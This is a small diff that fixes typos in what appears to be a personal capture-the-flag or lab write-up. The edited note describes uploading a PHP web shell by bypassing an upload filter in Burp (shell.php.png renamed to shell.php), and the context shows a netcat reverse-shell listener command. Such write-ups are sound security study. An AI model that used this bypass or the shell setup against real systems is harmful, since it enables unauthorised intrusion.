@@ -497,7 +497,7 @@ http://10.112.163.38:1337/file1010111/index.php?file=test
 ![](Obsidian%20assets/Exposeuploadsuccess.png)
 
 > [!note]
-> Managed to get the shell.php file uploaded vvia burp repeater after intercepting initial file upload request as shell.php.png to allow therequest through and trick the file upload and change to shell.php and it was a success as shown in the response image.
+> Managed to get the shell.php file uploaded via burp repeater after intercepting initial file upload request as shell.php.png to allow the request through and trick the file upload and change to shell.php and it was a success as shown in the response image.
 
 ```
 root@ip-10-114-71-118:~# nc -lvnp 4445
